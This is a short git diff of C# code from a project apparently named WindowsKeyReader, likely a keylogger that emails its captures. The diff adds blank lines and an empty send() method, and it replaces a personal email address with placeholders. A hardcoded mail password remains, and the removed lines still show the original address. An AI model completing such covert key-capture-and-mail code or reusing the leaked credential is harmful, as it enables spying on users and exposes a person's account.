@@ -26,7 +26,11 @@ namespace WindowsKeyReader
         static bool exitProc = false;
         private delegate bool EventHandler(CtrlType had);
         static EventHandler _handler;
-        
+
+
+
+
+
         /// <summary>
         //
         /// </summary>
@@ -50,7 +54,14 @@ namespace WindowsKeyReader
             {
                 Thread.Sleep(500);
             }
+
+
+            
+
         }
+
+        public void send()
+        { }
 
         public void Start()
         {
@@ -159,8 +170,8 @@ namespace WindowsKeyReader
 
         public void email()
         {
-            var fromAddress = new MailAddress("lombaardzander@gamil.com", "Zander Lombaard");
-            var toAddress = new MailAddress("lombaardzander@gmail.com", "Zander Lombaard");
+            var fromAddress = new MailAddress("email@gamil.com", "user name");
+            var toAddress = new MailAddress("email@gmail.com", "user name");
             const string fromPassword = "0815604051";
             const string subject = "Toets";
             const string body = "Toets";
